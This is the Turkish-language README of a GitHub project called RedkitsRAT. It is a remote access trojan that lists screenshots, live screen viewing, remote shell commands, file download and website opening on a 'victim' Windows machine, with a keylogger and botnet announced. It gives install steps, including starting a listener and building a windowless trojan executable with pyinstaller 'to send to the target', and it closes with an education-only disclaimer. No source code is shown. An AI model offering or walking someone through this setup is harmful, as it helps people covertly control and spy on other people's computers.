# 🐀 RedkitsRAT

Bu RAT programının bedava sürümünü güvenle kullanabilirsiniz. Geliştirilmeye devam eden modülleriyle temel uzak yönetim ihtiyaçlarını karşılar.


<p align="center">
  <img src="https://github.com/YAYTech/RedkitsRAT/blob/main/assets/RATlogo.png" alt="RedkitsRAT Logo" width="1000"/>
</p>


---

## 🚀 Özellikler

*   📸 Ekran görüntüsü (SS) alma
*   📺 Canlı ekran paylaşımı
*   🐚 Temel shell (komut satırı) komutlarını çalıştırma
*   📥 Dosya indirme & 📂 Dosya açma
*   🌐 Hedefte istenen web sitesini açma
*   ⏳ *Keylogger (Yakında)*
*   ⏳ *Botnet (Yakında)*

---

## 💻 Desteklenen Platformlar

| Bileşen | Desteklenen İşletim Sistemleri |
| :--- | :--- |
| **Trojan (Kurban)** | Windows 10, Windows 11 |
| **Listener (Dinleyici)** | Linux, Windows, macOS |

---

## 🛠️ Gereksinimler

*   **Python:** En güncel Python 3 sürümü (`Python 3.10+` önerilir)
*   **Bağımlılıklar:** `requirements.txt` dosyasındaki kütüphaneler

---

## 📦 Kurulum ve Çalıştırma

Projeyi bilgisayarınıza indirdikten sonra terminal veya komut satırını açıp sırasıyla aşağıdaki komutları çalıştırın:

```bash
# 1. Gerekli kütüphaneleri yükleyin
pip install -r requirements.txt

# 2. Dinleyiciyi (Listener) başlatın
python listener.py

# 3. Hedefe gönderilecek trojanı oluşturun
pyinstaller --onefile --noconsole trojan.py

```



---




## ⚠️ ÖNEMLİ UYARI VE YASAL SORUMLULUK REDDİ (DISCLAIMER)

> **Bu proje yalnızca EĞİTİM ve ARAŞTIRMA amacıyla geliştirilmiştir.**

* **RedkitsRAT**, sistem yöneticilerinin kendi ağlarını test etmesi veya siber güvenlik meraklılarının kötü amaçlı yazılımların çalışma mantığını anlaması (analiz etmesi) için tasarlanmıştır.
* Bu yazılımın, sahibinin açık izni olmayan herhangi bir bilgisayarda/sistemde kullanılması **YASALARA AYKIRIDIR** ve suç teşkil eder.
* Yazılımın hatalı kullanımından, yol açabileceği veri kayıplarından veya herhangi bir illegal faaliyetten **geliştirici (yazar) hiçbir şekilde sorumlu tutulamaz.** * Bu projeyi indirerek, inceleyerek veya kullanarak tüm sorumluluğun tamamen kendinize ait olduğunu kabul etmiş sayılırsınız.

**Lütfen siber güvenlik çalışmalarınızı her zaman etik ve yasal sınırlar dahilinde yürütün.**
